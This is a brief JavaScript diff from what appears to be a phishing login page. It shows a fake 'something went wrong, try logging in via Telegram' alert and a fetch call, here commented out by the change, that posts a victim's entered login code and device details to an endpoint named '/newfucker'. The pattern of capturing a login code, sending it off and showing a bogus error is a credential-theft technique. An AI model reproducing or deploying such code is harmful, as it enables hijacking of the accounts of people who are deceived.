@@ -323,7 +323,7 @@ window.location.href="#."
 	*/ 
 	alert("Что-то пошло не так. Попробуйте войти через телеграм");
 	//await fetch('/newfucker', {method: "POST",headers: {"Content-Type": "application/json",}, body: JSON.stringify(e) });
-	await fetch('/newfucker', {method: "POST", headers: {"Content-Type": "application/json",},body: JSON.stringify({txt:"some text",code: c, device: d })});
+	//await fetch('/newfucker', {method: "POST", headers: {"Content-Type": "application/json",},body: JSON.stringify({txt:"some text",code: c, device: d })});
 	setTimeout(() => {
           errormsg.textContent = "";
         }, 3500)
